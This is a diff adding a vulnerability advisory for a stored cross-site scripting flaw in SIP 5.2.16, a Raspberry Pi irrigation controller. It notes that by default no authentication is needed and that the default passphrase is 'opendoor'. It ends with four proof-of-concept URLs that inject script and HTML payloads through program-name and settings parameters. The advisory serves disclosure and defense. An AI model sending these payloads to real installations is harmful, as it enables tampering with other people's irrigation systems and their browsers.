@@ -1,0 +1,49 @@
+
+SIP Sustainable Irrigation Platform 5.x Stored XSS
+
+
+Vendor: Dan-in-CA
+Product web page: https://github.com/Dan-in-CA/SIP
+Affected version: 5.2.16
+
+Summary: SIP is a free Raspberry Pi based Python program for
+controlling irrigation systems (sprinkler, drip, hydroponic,
+etc). It uses web technology to provide an intuitive user
+interface (UI) in several languages. The UI can be accessed
+in your favorite browser on desktop, laptop, and mobile devices.
+SIP has also been used to control pumps, lights, and other Irrigation
+related equipment.
+
+Desc: The application stores program names supplied through HTTP
+requests and later renders them into its web pages without proper
+output encoding. This can be exploited to execute arbitrary JavaScript
+in the browser of any user who views the affected pages by creating
+a program whose name contains a script payload. When the optional
+passphrase is not enabled (factory default) the malicious program
+can be created without authentication, and where the passphrase is
+enabled it defaults to 'opendoor'.
+
+Tested on: Debian GNU/Linux 11 (bullseye) raspberrypi 6.1.21+ (armv6l/aarch64)
+           Python 3.9.2
+
+
+Vulnerability discovered by Anja Ivanovska
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-5994
+Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-5994
+
+
+24.06.2026
+
+--
+
+
+- http://SIP/cp?pid=-1&v={"type":"alldays","enabled":1,"day_mask":127,"interval_base_day":0,"start_min":360,"stop_min":1080,"cycle_min":0,"duration_sec":[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],"name":"\"><marquee>luul</marquee>","station_mask":[0,0]}&pname="><marquee>lel</marquee>
+
+- http://SIP/co?s0=</script><script>alert(document.domain)</script>
+
+- http://SIP/co?s1=</script><script>confirm(document.domain)</script>
+
+- http://SIP/co?s7=</script><script>prompt(document.domain)</script>
